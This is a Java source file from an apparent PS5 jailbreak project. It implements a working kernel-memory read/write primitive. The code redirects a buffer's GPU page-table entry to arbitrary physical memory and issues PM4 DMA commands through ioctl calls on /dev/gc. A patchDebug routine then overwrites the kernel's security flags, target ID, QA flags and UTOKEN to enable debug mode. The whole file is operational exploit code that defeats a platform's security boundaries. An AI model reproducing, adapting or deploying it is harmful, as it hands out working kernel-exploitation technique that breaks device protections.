/*
 * Copyright (c) 2026 Jaime
 * Modified
 *
 * This file is part of Poops-PS5-Java and is licensed under the MIT License.
 * See the LICENSE file in the root of the project for full license information.
 */

package org.bdj.external;

import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.api.KernelAPI;
import org.bdj.api.NativeInvoke;
import org.bdj.Status;

public class GPU {
    private static final String MPROTECT_SYMBOL = "mprotect";
    private static final String ALLOC_DMEM_SYMBOL = "sceKernelAllocateMainDirectMemory";
    private static final String MAP_DMEM_SYMBOL = "sceKernelMapDirectMemory";
    private static final String IOCTL_SYMBOL = "ioctl";
    private static final String OPEN_SYMBOL = "open";

    private static final long GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0L;
    private static final long CPU_PHYS_MASK = 0x000FFFFFFFFFF000L;
    private static final int PROT_READ = 0x01;
    private static final int PROT_WRITE = 0x02;
    private static final int GPU_READ = 0x10;
    private static final int GPU_WRITE = 0x20;
    private static final int MAP_NO_COALESCE = 0x400000;
    private static final long DMEM_SIZE = 2 * 0x100000L;

    // STRUCT OFFSETS
    // pmap
    private static final int PMAP_CR3 = 0x28;
    private static final int PMAP_PML4 = 0x20;
    // gpu vmspace
    private static final int SIZEOF_GVMSPACE = 0x100;
    private static final int GVMSPACE_START_VA = 0x08;
    private static final int GVMSPACE_SIZE = 0x10;
    private static final int GVMSPACE_PAGE_DIR = 0x38;
    // proc
    private static final int PROC_VM_SPACE = 0x200;

    public static long dmapBase, kernelCr3;
    private static int gpuFd = -1;

    private static long victimVa, transferVa, cmdVa;
    private static long clearedVictimPtbeForRo, victimPtbeVa;

    private static Buffer ioctlDesc = new Buffer(16);
    private static Buffer ioctlSub = new Buffer(16);
    private static Buffer ioctlTs = new Buffer(16);
    private static Buffer devGcPath = new Buffer(8);

    private static long mprotect;
    private static long alloc_dmem;
    private static long map_dmem;
    private static long ioctl;
    private static long open;

    private static void checkSymbol(long address, String name) {
        if (address == 0) {
            Status.println("[!] Symbol not found: " + name);
            throw new IllegalStateException("symbol not found: " + name);
        }
    }

    public static void init() {
        mprotect = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, MPROTECT_SYMBOL);
        alloc_dmem = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, ALLOC_DMEM_SYMBOL);
        map_dmem = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, MAP_DMEM_SYMBOL);
        ioctl = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, IOCTL_SYMBOL);
        open = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, OPEN_SYMBOL);

        checkSymbol(mprotect, "mprotect");
        checkSymbol(alloc_dmem, "alloc_dmem");
        checkSymbol(map_dmem, "map_dmem"); 
        checkSymbol(ioctl, "ioctl");
        checkSymbol(open, "open");
    }

    private static int mprotect(long a, long b, int c) {
        return (int) ExploitNetControlImpl.api.call(mprotect, a, b, c);
    }

    private static int alloc_dmem(long a, long b, int c, long d) {
        return (int) ExploitNetControlImpl.api.call(alloc_dmem, a, b, c, d);
    }

    private static int map_dmem(long a, long b, int c, int d, long e, long f) {
        return (int) ExploitNetControlImpl.api.call(map_dmem, a, b, c, d, e, f);
    }

    private static int ioctl(int fd, long request, long arg0) {
        return (int) ExploitNetControlImpl.api.call(ioctl, fd, request, arg0);
    }

    private static int open(long a, int b, int c) {
        return (int) ExploitNetControlImpl.api.call(open, a, b, c);
    }

    private static long physToDmap(long pa) {
        return dmapBase + pa;
    }

    private static long virtToPhys(long va, long cr3) {
        long pml4e = ExploitNetControlImpl.kapi.kread64(physToDmap(cr3) + ((va >>> 39) & 0x1FF) * 8);
        if (pml4e == 0 || (pml4e & 1) == 0)
            return 0;
        long pdpte = ExploitNetControlImpl.kapi.kread64(physToDmap(pml4e & CPU_PHYS_MASK) + ((va >>> 30) & 0x1FF) * 8);
        if (pdpte == 0 || (pdpte & 1) == 0)
            return 0;
        if ((pdpte & 0x80) != 0)
            return (pdpte & 0x000FFFFFC0000000L) | (va & 0x3FFFFFFFL);
        long pde = ExploitNetControlImpl.kapi.kread64(physToDmap(pdpte & CPU_PHYS_MASK) + ((va >>> 21) & 0x1FF) * 8);
        if (pde == 0 || (pde & 1) == 0)
            return 0;
        if ((pde & 0x80) != 0)
            return (pde & 0x000FFFFFFFE00000L) | (va & 0x1FFFFFL);
        long pte = ExploitNetControlImpl.kapi.kread64(physToDmap(pde & CPU_PHYS_MASK) + ((va >>> 12) & 0x1FF) * 8);
        if (pte == 0 || (pte & 1) == 0)
            return 0;
        return (pte & CPU_PHYS_MASK) | (va & 0xFFFL);
    }

    private static long getProcCr3(long proc) {
        long vmspace = ExploitNetControlImpl.kapi.kread64(proc + PROC_VM_SPACE);
        if (vmspace == 0 || (vmspace >>> 48) != 0xFFFF)
            return 0;
        for (int i = 1; i <= 6; i++) {
            long val = ExploitNetControlImpl.kapi.kread64(vmspace + 0x1C8 + i * 8);
            long diff = val - vmspace;
            if (diff >= 0x2C0 && diff <= 0x2F0)
                return ExploitNetControlImpl.kapi.kread64(val + PMAP_CR3);
        }
        return 0;
    }

    private static long getVmid(long proc) {
        long vmspace = ExploitNetControlImpl.kapi.kread64(proc + PROC_VM_SPACE);
        for (int i = 1; i <= 8; i++) {
            int val = ExploitNetControlImpl.kapi.kread32(vmspace + 0x1D4 + i * 4);
            if (val > 0 && val <= 0x10)
                return val;
        }
        return 0;
    }

    private static long gpuPdeField(long pde, int shift) {
        return (pde >>> shift) & 1;
    }

    private static long gpuPdeFrag(long pde) {
        return (pde >>> 59) & 0x1F;
    }

    private static long[] gpuWalkPt(long vmid, long virtAddr) {
        long gvmspace = ExploitNetControlImpl.dataBase + ExploitNetControlImpl.GVMSPACE + vmid * SIZEOF_GVMSPACE;
        long pdb2Addr = ExploitNetControlImpl.kapi.kread64(gvmspace + GVMSPACE_PAGE_DIR);

        long pml4e = ExploitNetControlImpl.kapi.kread64(pdb2Addr + ((virtAddr >>> 39) & 0x1FF) * 8);
        if (gpuPdeField(pml4e, 0) != 1)
            return null;

        long pdpPa = pml4e & GPU_PDE_ADDR_MASK;
        long pdpe = ExploitNetControlImpl.kapi.kread64(physToDmap(pdpPa) + ((virtAddr >>> 30) & 0x1FF) * 8);
        if (gpuPdeField(pdpe, 0) != 1)
            return null;

        long pdPa = pdpe & GPU_PDE_ADDR_MASK;
        long pdeIdx = (virtAddr >>> 21) & 0x1FF;
        long pde = ExploitNetControlImpl.kapi.kread64(physToDmap(pdPa) + pdeIdx * 8);
        if (gpuPdeField(pde, 0) != 1)
            return null;

        if (gpuPdeField(pde, 54) == 1)
            return new long[] { physToDmap(pdPa) + pdeIdx * 8, 0x200000 };

        long frag = gpuPdeFrag(pde);
        long offset = virtAddr & 0x1FFFFF;
        long ptPa = pde & GPU_PDE_ADDR_MASK;
        long pteIdx, pageSize;

        if (frag == 4) {
            pteIdx = offset >>> 16;
            long pte = ExploitNetControlImpl.kapi.kread64(physToDmap(ptPa) + pteIdx * 8);
            if (gpuPdeField(pte, 0) == 1 && gpuPdeField(pte, 56) == 1) {
                pteIdx = (virtAddr & 0xFFFF) >>> 13;
                pageSize = 0x2000;
            } else {
                pageSize = 0x10000;
            }
        } else if (frag == 1) {
            pteIdx = offset >>> 13;
            pageSize = 0x2000;
        } else {
            return null;
        }

        return new long[] { physToDmap(ptPa) + pteIdx * 8, pageSize };
    }

    private static long[] getPtbEntry(long proc, long va) {
        long vmid = getVmid(proc);
        if (vmid == 0)
            return null;
        long gvmspace = ExploitNetControlImpl.dataBase + ExploitNetControlImpl.GVMSPACE + vmid * SIZEOF_GVMSPACE;
        long startVa = ExploitNetControlImpl.kapi.kread64(gvmspace + GVMSPACE_START_VA);
        long gvmSize = ExploitNetControlImpl.kapi.kread64(gvmspace + GVMSPACE_SIZE);
        if (va < startVa || va >= startVa + gvmSize)
            return null;
        return gpuWalkPt(vmid, va - startVa);
    }

    private static long[] allocMainDmem(long size, int prot, int flags) {
        Buffer out = new Buffer(8);
        if (alloc_dmem(size, size, 1, out.address()) != 0)
            return null;
        long phys = out.getLong(0);
        out.putLong(0, 0);
        if (map_dmem(out.address(), size, prot, flags, phys, size) != 0)
            return null;
        return new long[] { out.getLong(0), phys };
    }

    private static long pm4Type3Header(int opcode, int count) {
        return (0x02L | ((long) (opcode & 0xFF) << 8) | (((long) (count - 1) & 0x3FFF) << 16) | (0x03L << 30))
                & 0xFFFFFFFFL;
    }

    private static int writePm4DmaTo(long bufVa, long dstVa, long srcVa, long length) {
        long dmaHdr = 0x8C00C000L;
        ExploitNetControlImpl.api.write32(bufVa + 0x00, (int) pm4Type3Header(0x50, 6));
        ExploitNetControlImpl.api.write32(bufVa + 0x04, (int) dmaHdr);
        ExploitNetControlImpl.api.write32(bufVa + 0x08, (int) (srcVa & 0xFFFFFFFFL));
        ExploitNetControlImpl.api.write32(bufVa + 0x0C, (int) ((srcVa >>> 32) & 0xFFFFFFFFL));
        ExploitNetControlImpl.api.write32(bufVa + 0x10, (int) (dstVa & 0xFFFFFFFFL));
        ExploitNetControlImpl.api.write32(bufVa + 0x14, (int) ((dstVa >>> 32) & 0xFFFFFFFFL));
        ExploitNetControlImpl.api.write32(bufVa + 0x18, (int) (length & 0x1FFFFFL));
        return 28;
    }

    private static boolean submitViaIoctl(long cmdVa, int cmdSize) {
        long dwords = cmdSize >>> 2;
        ioctlDesc.putLong(0, ((cmdVa & 0xFFFFFFFFL) << 32) | 0xC0023F00L);
        ioctlDesc.putLong(8, ((dwords & 0xFFFFFL) << 32) | ((cmdVa >>> 32) & 0xFFFFL));
        ioctlSub.putInt(0, 0);
        ioctlSub.putInt(4, 1);
        ioctlSub.putLong(8, ioctlDesc.address());
        ioctl(gpuFd, 0xC0108102L, ioctlSub.address());
        ExploitNetControlImpl.ksleep(1);
        return true;
    }

    private static void transferPhys(long physAddr, long size, boolean isWrite) {
        long trunc = physAddr & ~(DMEM_SIZE - 1);
        long offset = physAddr - trunc;
        int protRo = PROT_READ | PROT_WRITE | GPU_READ;
        int protRw = protRo | GPU_WRITE;

        mprotect(victimVa, DMEM_SIZE, protRo);
        ExploitNetControlImpl.kapi.kwrite64(victimPtbeVa, clearedVictimPtbeForRo | trunc);
        mprotect(victimVa, DMEM_SIZE, protRw);

        long src = isWrite ? transferVa : (victimVa + offset);
        long dst = isWrite ? (victimVa + offset) : transferVa;
        submitViaIoctl(cmdVa, writePm4DmaTo(cmdVa, dst, src, size));
    }

    public static int read32(long kaddr) {
        long pa = virtToPhys(kaddr, kernelCr3);
        if (pa == 0)
            return 0;
        transferPhys(pa, 4, false);
        return ExploitNetControlImpl.api.read32(transferVa);
    }

    public static void write32(long kaddr, int val) {
        long pa = virtToPhys(kaddr, kernelCr3);
        if (pa == 0)
            return;
        ExploitNetControlImpl.api.write32(transferVa, val);
        transferPhys(pa, 4, true);
    }

    public static void write8(long kaddr, byte val) {
        long aligned = kaddr & 0xFFFFFFFFFFFFFFFCL;
        long byteoff = kaddr - aligned;
        int dw = read32(aligned);
        dw = (dw & ~(0xFF << (byteoff * 8))) | ((val & 0xFF) << (byteoff * 8));
        write32(aligned, dw);
    }

    public static boolean setup(long curproc) {
        devGcPath.put(0, "/dev/gc\0".getBytes());
        // Status.println("devGcPath = " + devGcPath, false);
        gpuFd = open(devGcPath.address(), 2, 0); // O_RDWR = 2
        // Status.println("gpuFd = " + gpuFd, false);
        if (gpuFd < 0) {
            return false;
        }

        ioctlTs.putLong(0, 0);
        ioctlTs.putLong(8, 10000L); // 10us timeout

        long pmapStore = ExploitNetControlImpl.dataBase + ExploitNetControlImpl.KERNEL_PMAP_STORE;
        long pmPml4 = ExploitNetControlImpl.kapi.kread64(pmapStore + PMAP_PML4);
        long pmCr3 = ExploitNetControlImpl.kapi.kread64(pmapStore + PMAP_CR3);
        dmapBase = pmPml4 - pmCr3;
        kernelCr3 = pmCr3;
        // Status.println("kernelCr3 = 0x" + Long.toHexString(kernelCr3), false);

        int protRw = PROT_READ | PROT_WRITE | GPU_READ | GPU_WRITE;
        long[] v = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
        long[] t = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
        long[] c = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);

        // Status.println("v = 0x" + Long.toHexString(kernelCr3) + ", t = 0x" + Long.toHexString(kernelCr3) + ", c = 0x" + Long.toHexString(kernelCr3), false);
        if ((v == null) || (t == null) || (c == null)) {
            return false;
        }

        victimVa = v[0];
        transferVa = t[0];
        cmdVa = c[0];
        // Status.println("victimVa = 0x" + Long.toHexString(kernelCr3) + ", transferVa = 0x" + Long.toHexString(kernelCr3) + ", cmdVa = 0x" + Long.toHexString(kernelCr3), false);

        long procCr3 = getProcCr3(curproc);
        long victimRealPa = virtToPhys(victimVa, procCr3);
        long[] ptb = getPtbEntry(curproc, victimVa);
        // Status.println("ptb = 0x" + Long.toHexString(kernelCr3), false);
        if (ptb == null || ptb[1] != DMEM_SIZE)
            return false;

        victimPtbeVa = ptb[0];
        mprotect(victimVa, DMEM_SIZE, PROT_READ | PROT_WRITE | GPU_READ);
        long initialPtbe = ExploitNetControlImpl.kapi.kread64(victimPtbeVa);
        clearedVictimPtbeForRo = initialPtbe & (~victimRealPa);
        mprotect(victimVa, DMEM_SIZE, protRw);

        return true;
    }

    public static void patchDebug() {
        long secFlagsAddr = ExploitNetControlImpl.dataBase + ExploitNetControlImpl.SECURITY_FLAGS;
        Status.println(" |-> Patching Security Flags...");
        int sf = read32(secFlagsAddr);
        write32(secFlagsAddr, sf | 0x14);

        Status.println(" |-> Patching Target ID...");
        write8(secFlagsAddr + 0x09, (byte) 0x82);

        Status.println(" |-> Patching QA Flags...");
        int qa = read32(secFlagsAddr + 0x24);
        write32(secFlagsAddr + 0x24, qa | 0x10300);

        Status.println(" |-> Patching UTOKEN...");
        long utAddr = secFlagsAddr + 0x8C;
        long utAligned = utAddr & 0xFFFFFFFFFFFFFFFCL;
        long utByte = utAddr - utAligned;
        int utDw = read32(utAligned);
        int utVal = (utDw >>> (utByte * 8)) & 0xFF;
        int newDw = (utDw & ~(0xFF << (utByte * 8))) | (((utVal | 0x01) & 0xFF) << (utByte * 8));
        write32(utAligned, newDw);
    }
}
